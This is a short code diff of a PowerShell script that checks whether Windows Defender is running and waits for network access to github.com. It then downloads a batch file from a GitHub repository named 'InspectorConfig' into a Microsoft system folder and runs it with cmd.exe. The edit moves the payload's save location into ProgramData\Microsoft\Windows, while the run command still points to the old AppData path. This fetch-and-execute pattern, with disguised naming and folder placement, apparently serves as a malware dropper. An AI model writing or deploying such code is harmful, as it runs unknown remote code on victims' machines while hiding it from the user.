@@ -91,7 +91,7 @@ if($(GET-Service -Name WinDefend).Status -eq "Running") {
 do {
   $ping = test-connection -comp github.com -count 1 -Quiet
 } until ($ping){
-      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:appdata\Microsoft\one.bat
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat
      }   
     cmd.exe /c '%appdata%\Microsoft\one.bat'
 }
